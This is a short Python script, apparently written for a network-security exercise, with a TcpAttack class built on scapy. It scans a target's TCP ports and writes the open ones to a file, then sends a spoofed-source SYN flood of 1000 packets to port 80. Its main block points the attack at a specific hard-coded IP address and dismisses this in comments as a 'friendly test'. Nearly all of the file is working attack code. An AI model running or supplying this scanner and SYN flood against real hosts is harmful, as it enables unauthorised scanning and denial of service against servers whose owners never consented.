#! /usr/bin/env python

__author__ = 'Jinyi Zhang'

import socket
from scapy.all import *

class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):

        f = open("openports.txt", 'w')
        f.write("Opened ports: \n")

        for port in range(rangeStart, rangeEnd):
	    
	    # create a socket using default parameters
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # set the timeout
            s.settimeout(0.5)

            # try to connect
            result = s.connect_ex((self.targetIP, port))

            if (result == 0):
                # connect succeed, so port is open
                #print("Open Port: {0}". format(port))
                f.write("Port: {}\n".format(port))
            #else:
            #    print("Closed Port: {0}". format(port))
            s.close()

        f.close()

    def attackTarget(self, port):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(5)

        result = s.connect_ex((self.targetIP, port))
        
        s.close()

        if (result == 0):
            for ct in range(1000):
		# use scapy to send SYN packet
                send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(), dport=port, flags="S"))
            return 1
        else:
            print("The port is not opened!")
            return 0

if __name__ == "__main__":

    spoofIP = '192.137.43.211'  # a fake IP address I made up
    targetIP = '128.46.75.105'  # A website has only one static ip

    rangeStart = 20
    rangeEnd = 445
    port = 80    # The server of a website must open its 80 port

    # please forgive this friendly test.
    # I really don't think 1000 SYN packets will cause any problem. 
    tcp = TcpAttack(spoofIP, targetIP)

    # scan ports from 20 to 444
    tcp.scanTarget(rangeStart, rangeEnd)

    # attack 80 port
    if (tcp.attackTarget(80)):
	print "port was open to attack"

